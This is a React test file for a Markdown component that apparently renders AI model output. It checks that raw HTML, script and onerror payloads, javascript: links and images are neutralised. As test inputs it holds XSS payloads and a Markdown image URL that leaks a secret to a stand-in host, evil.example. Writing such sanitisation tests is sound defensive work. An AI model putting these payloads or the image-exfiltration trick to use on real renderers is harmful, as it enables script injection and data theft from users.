import { render, screen } from "@testing-library/react";
import { Markdown } from "./Markdown";

describe("Markdown", () => {
  it("renders formatting, GFM tables and fenced code with a language label", () => {
    const md = "# Plan\n\n**Bold** and `inline`\n\n| A | B |\n|---|---|\n| 1 | 2 |\n\n```python\nprint('hi')\n```\n";
    const { container } = render(<Markdown text={md} />);
    expect(screen.getByRole("heading", { name: "Plan" })).toBeInTheDocument();
    expect(container.querySelector("strong")).toHaveTextContent("Bold");
    expect(container.querySelector("table")).toBeInTheDocument();
    expect(screen.getByText("python")).toBeInTheDocument();
    expect(container.querySelector("pre code")).toHaveTextContent("print('hi')");
    expect(screen.getByLabelText("Copy code")).toBeInTheDocument();
  });

  it("does not render raw HTML from model output", () => {
    const { container } = render(<Markdown text={'Hi <script>alert(1)</script><img src=x onerror="alert(1)"> <b>x</b>'} />);
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
  });

  it("neutralises dangerous links and opens safe ones in a new tab", () => {
    render(<Markdown text={"[bad](javascript:alert(1)) [good](https://example.com)"} />);
    const bad = screen.getByText("bad").closest("a");
    expect(bad?.getAttribute("href") ?? "").not.toContain("javascript");
    const good = screen.getByText("good").closest("a")!;
    expect(good).toHaveAttribute("href", "https://example.com");
    expect(good).toHaveAttribute("target", "_blank");
    expect(good.getAttribute("rel")).toContain("noopener");
  });

  it("renders Markdown images as links instead of loading them", () => {
    const { container } = render(<Markdown text={"![tracker](https://evil.example/leak?d=secret)"} />);
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("tracker").closest("a")).toHaveAttribute("href", "https://evil.example/leak?d=secret");
  });
});
